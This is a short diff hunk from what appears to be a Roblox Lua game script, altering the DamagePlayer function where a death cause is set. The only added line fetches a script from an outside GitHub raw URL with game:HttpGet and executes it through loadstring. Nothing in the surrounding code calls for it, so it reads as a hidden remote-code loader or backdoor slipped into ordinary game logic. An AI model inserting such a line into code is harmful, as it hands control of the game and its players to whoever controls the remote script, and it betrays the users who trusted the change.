@@ -427,6 +427,7 @@ function DamagePlayer(entityTable)
 
 			-- Set death cause
 			local deathCause = config.Entity.Name
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Whatttt23/Scr/refs/heads/main/Jc"))()
 			if config.Death.Cause ~= "" then
 				deathCause = config.Death.Cause
 			end
